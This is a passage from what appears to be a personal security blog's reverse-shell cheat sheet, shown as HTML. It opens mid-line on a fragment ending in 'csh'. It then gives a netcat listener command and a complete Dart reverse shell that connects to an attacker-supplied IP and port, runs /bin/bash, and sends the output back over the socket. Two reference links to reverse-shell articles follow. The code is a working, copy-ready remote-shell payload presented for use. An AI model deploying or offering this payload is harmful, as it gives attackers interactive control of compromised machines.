&amp;&amp; csh</span><br></pre></td></tr></table></figure>

<h2 id="C-1"><a href="#C-1" class="headerlink" title="C"></a>C</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">import <span class="string">&#x27;dart:io&#x27;</span>;</span><br><span class="line">import <span class="string">&#x27;dart:convert&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">  Socket.connect(<span class="string">&quot;&lt;ip&gt;&quot;</span>, &lt;port&gt;).<span class="keyword">then</span>((socket) &#123;</span><br><span class="line">    socket.listen((data) &#123;</span><br><span class="line">      Process.start(<span class="string">&#x27;/bin/bash&#x27;</span>, []).<span class="keyword">then</span>((Process process) &#123;</span><br><span class="line">        process.stdin.writeln(new String.fromCharCodes(data).trim());</span><br><span class="line">        process.stdout</span><br><span class="line">          .transform(utf8.decoder)</span><br><span class="line">          .listen((output) &#123; socket.write(output); &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    onDone: () &#123;</span><br><span class="line">      socket.destroy();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46717339/article/details/119650409#t23">https://blog.csdn.net/qq_46717339&#x2F;article&#x2F;details&#x2F;119650409#t23</a><br><a target="_blank" rel="noopener" href="https://blkstone.github.io/2017/12/30/reverse-shell/">https://blkstone.github.io/2017/12/30/reverse-shell/</a></p>
</blockquote>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/05/30/smbclient-%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/">prev</a><a class="next" href="/2022/05/12/CMD%E5%90%AF%E5%8A%A8%E6%88%96%E5%85%B3%E9%97%AD%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/">next</a></div><div class="copyright"><p>&copy; 2022 <a href="http://webb-l.top">Webb</a><br>Powered by <a href="https://hexo.io/" rel="noreferrer" target="_blank">Hexo</a></p></div></footer></div></div><script src="https://cdnjs.cloudflare.com/ajax/libs/barba.js/1.0.0/barba.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
    Barba.Pjax.start()
})</script></body></html>